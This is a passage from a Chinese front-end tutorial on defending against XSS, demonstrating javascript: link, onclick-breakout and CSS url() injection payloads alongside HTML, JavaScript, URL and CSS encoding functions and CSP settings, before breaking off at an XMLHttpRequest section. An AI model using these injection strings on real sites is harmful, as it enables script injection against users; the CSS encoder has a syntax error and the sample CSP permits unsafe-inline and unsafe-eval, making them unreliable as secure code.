比如如下代码：<a href="javascript:alert('href xss')" target="_blank">href xss</a> 是可以点击的。 如果我们对该进行html属性编码一下，还是可以点击的，
如代码：<a href="javascript&#x3a;alert&#x28;&#x27;href&#x20;xss&#x20;HTML编码无效&#x27;&#x29;" target="_blank">href xss HTML属性编码无效</a> 页面还是可以点击的。如下图所示：

<img src="https://img2018.cnblogs.com/blog/561794/201905/561794-20190522232335640-699376024.png" alt="img" style="zoom:67%;" />

如下对href属性编码：

```
var str = "javascript:alert('href xss')";
// 使用正则表达式实现html编码
function encodeForHTMLAttibute(str) {
  let encoded = '';
  for(let i = 0; i < str.length; i++) {
    let ch = hex = str[i];
    if (!/[A-Za-z0-9]/.test(str[i]) && str.charCodeAt(i) < 256) {
      hex = '&#x' + ch.charCodeAt(0).toString(16) + ';';
    }
    encoded += hex;
  }
  return encoded;
};
console.log(encodeForHTMLAttibute(str)); // javascript&#x3a;alert&#x28;&#x27;href&#x20;xss&#x27;&#x29;
```

那么现在假如我们对alert('href xss')进行JavaScript编码，结果又会如何？（JavaScript编码将字符编码成\x+16进制的形式，对款字节编码成Unicode）

**注意：XSS防御之javascript编码代码如下：**

```
function encodeForJavascript(str) {
  let encoded = '';
  for(let i = 0; i < str.length; i++) {
    let cc = hex = str[i];
    if (!/[A-Za-z0-9]/.test(str[i]) && str.charCodeAt(i) < 256) {
      hex = '\\x' + cc.charCodeAt().toString(16);
    }
    encoded += hex;
  }
  return encoded;
};
```

如下demo演示：

```
<!DOCTYPE html>
<html>
<head>
  <meta charset=utf-8>
  <meta name="referrer" content="never">
  <title></title>
</head>
<body>
  <div>
    <a href="javascript:alert\x28\x27href\x20xss\x27\x29" target="_blank">Href XSS JavaScript编码</a>
  </div>
  <script type="text/javascript">
    var str = "alert('href xss')";
    function encodeForJavascript(str) {
      let encoded = '';
      for(let i = 0; i < str.length; i++) {
        let cc = hex = str[i];
        if (!/[A-Za-z0-9]/.test(str[i]) && str.charCodeAt(i) < 256) {
          hex = '\\x' + cc.charCodeAt().toString(16);
        }
        encoded += hex;
      }
      return encoded;
    };
    console.log(encodeForJavascript(str)); // alert\x28\x27href\x20xss\x27\x29
  </script>
</body>
</html>
```

现在我们再来点击上面的a链接是不会有任何效果的。因此 XSS执行失败; 当然对onclick 事件等其他的也是一样的要进行编码。我们也可以继续看下：onclick属性XSS

**onclick属性XSS**

比如现在我们来看一下on事件属性：<div id="test" onclick="testFunc(value)">xxs测试</div>（此处的value)">xxs测试</div>（此处的value往往一般都是后台模板替换的变量）<div id="test" onclick="testFunc('$value')">xxs测试</div>

当$value的值 hello world'),alert('onclick xss 时，就会触发XSS攻击；代码就会变成如下：

```
<div id="test" onclick="testFunc('hello world'),alert('onclick xss')" >xxs测试</div>
```

因此demo如下：

```
<!DOCTYPE html>
<html>
<head>
  <meta charset=utf-8>
  <meta name="referrer" content="never">
  <title></title>
</head>
<body>
  <div id="test" onclick="testFunc('hello world'),alert('onclick xss')">xxs测试</div>
  <script type="text/javascript">
    function testFunc(xx) {
      
    }
  </script>
</body>
</html>
```

当我点击xss测试的时候，就会变成如下所示：

如果我们使用html编码是不行的，对$value进行HTML编码, 我们可以看看如下demo所示：

```
<!DOCTYPE html>
<html>
<head>
  <meta charset=utf-8>
  <meta name="referrer" content="never">
  <title></title>
</head>
<body>
  <div id="test" onclick="testFunc('hello&#x20;world&#x27;&#x29;&#x2c;alert&#x28;&#x27;onclick&#x20;xss')">xxs测试</div>
  <script type="text/javascript">
    function testFunc() {}
    
    var str = "hello world'),alert('onclick xss";
    // 使用正则表达式实现html编码
    function encodeForHTMLAttibute(str) {
      let encoded = '';
      for(let i = 0; i < str.length; i++) {
        let ch = hex = str[i];
        if (!/[A-Za-z0-9]/.test(str[i]) && str.charCodeAt(i) < 256) {
          hex = '&#x' + ch.charCodeAt(0).toString(16) + ';';
        }
        encoded += hex;
      }
      return encoded;
    };
    console.log(encodeForHTMLAttibute(str)); 
    // hello&#x20;world&#x27;&#x29;&#x2c;alert&#x28;&#x27;onclick&#x20;xss
  </script>
</body>
</html>
```

如上代码，我们继续点击xxx测试的时候，还是可以弹窗的。

现在如果我们继续将$value进行JavaScript编码：显示正常，不存在XSS。 如下代码所示：

```
<!DOCTYPE html>
<html>
<head>
  <meta charset=utf-8>
  <meta name="referrer" content="never">
  <title></title>
</head>
<body>
  <div id="test" onclick="testFunc('hello\x20world\x27\x29\x2calert\x28\x27onclick\x20xss')">xxs测试</div>
  <script type="text/javascript">
    function testFunc() {}
    
    var str = "hello world'),alert('onclick xss";
    // 使用正则表达式实现html编码
    function encodeForJavascript(str) {
      let encoded = '';
      for(let i = 0; i < str.length; i++) {
        let cc = hex = str[i];
        if (!/[A-Za-z0-9]/.test(str[i]) && str.charCodeAt(i) < 256) {
          hex = '\\x' + cc.charCodeAt().toString(16);
        }
        encoded += hex;
      }
      return encoded;
    };
    console.log(encodeForJavascript(str)); 
    // hello\x20world\x27\x29\x2calert\x28\x27onclick\x20xss
  </script>
</body>
</html>
```

我们继续点击就没有任何反应了，大家自己可以试试下。因此就不会存在xss攻击了。

XSS 防御之 URL 编码

作用范围：将不可信数据作为 URL 参数值时需要对参数进行 URL 编码
编码规则：将参数值进行 encodeURIComponent 编码

编码代码如下：

```
function encodeForURL(str){
  return encodeURIComponent(str);
};
```

XSS 防御之 CSS 编码

作用范围：将不可信数据作为 CSS 时进行 CSS 编码
比如：通过css构造（background-img:url\expression\link-href@import）

```
<div style="background-image: url(javascript:alert('xss'));"></div>
<style>body{background-image: url("javascript:alert('xss')");}</style>
```

编码规则：除了字母数字字符以外，使用\XXXXXX格式来转义ASCII值小于256的所有字符。 编码代码如下：

```
function encodeForCSS (attr, str){
  let encoded = '';
  for (let i = 0; i < str.length; i++) {
    let ch = str.charAt(i);
    if (!ch.match(/[a-zA-Z0-9]/) {
      let hex = str.charCodeAt(i).toString(16);
      let pad = '000000'.substr((hex.length));
      encoded += '\\' + pad + hex;
    } else {
      encoded += ch;
    }
  }
  return encoded;
};
```

开启CSP网页安全政策防止XSS攻击

Content-Security-Policy 中文的意思是 网页安全政策，

CSP是网页安全政策(Content Security Policy)的缩写。主要用来防止XSS攻击。是一种由开发者定义的安全性政策申明，通过CSP所约束的责任指定可信的内容来源，通过 Content-Security-Policy 网页的开发者可以控制整个页面中 外部资源 的加载和执行。
比如可以控制哪些 域名下的静态资源可以被页面加载，哪些不能被加载。这样就可以很大程度的防范了 来自 跨站(域名不同) 的脚本攻击。

如何使用呢？

我们只需要在meta属性中设置下即可：如下代码：

```
<meta http-equiv="Content-Security-Policy" content="">
```

比如如下的列子：

```
<meta http-equiv="Content-Security-Policy" content="
default-src http: https:  *.xxx.com 'self' 'unsafe-inline' ;
style-src 'self' 'unsafe-inline' *.yyy.com;
script-src 'self' 'unsafe-inline' 'unsafe-eval' ;
">
```

默认设置（default-src）：信任 http ,https协议资源，信任当前域名资源，信任符合*.xxx.com的域名资源CSS设置（style-src）：信任当前域名资源，允许内嵌的CSS资源，信任来自*.yyy.com下的CSS资源。
JS设置（script-src）：信任当前域名资源，允许内嵌的JS执行，允许将字符串当作代码执行

有如下类别

default-src 给下面所有的规则设定一个默认值
	  script-src 外部脚本
	  style-src 样式表
	  img-src 图像
	  media-src 媒体文件（音频和视频）
	  font-src 字体文件
	  object-src 插件（比如 Flash）
	  child-src 框架
	  frame-ancestors 嵌入的外部资源（比如、<iframe>、和）
	  connect-src HTTP 连接（通过 XHR、WebSockets、EventSource等）
     worker-src worker脚本
     manifest-src manifest 文件

**script-src有如下属性值：**

unsafe-inline 允许执行页面内嵌的<script>标签和事件监听函数
unsafe-eval 允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数
nonce 每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行
hash 列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行

# 网络请求

> 由于ajax等各种库的流行（axios，jquery)，我们对于原生的网络请求的理解越来越来越少了，虽然这些流行的库能很好地满足了我们平时的开发活动，但是这并不利于我们对底层地理解，所以这章我将对网络请求进行底层的探究。
>

## XMLHttpRequest

> `XMLHttpRequest`（XHR）对象用于与服务器交互。通过 XMLHttpRequest 可以在不刷新页面的情况下请求特定 URL，获取数据。这允许网页在不影响用户操作的情况下，更新页面的局部内容。`XMLHttpRequest` 在 [AJAX](https://developer.mozilla.org/zh-CN/docs/Glossary/AJAX) 编程中被大量使用。
>
> 尽管名称如此，`XMLHttpRequest` 可以用于获取任何类型的数据，而不仅仅是 XML。它甚至支持 [HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP) 以外的协议（包括 file:// 和 FTP），尽管可能受到更多出于安全等原因的限制。
>
> 如果您的通信流程需要从服务器端接收事件或消息数据，请考虑通过 [`EventSource`](https://developer.mozilla.org/zh-CN/docs/Web/API/EventSource) 接口使用 [server-sent events](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events)。对于全双工的通信， [WebSocket](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API) 可能是更好的选择。

基本使用：

```

```

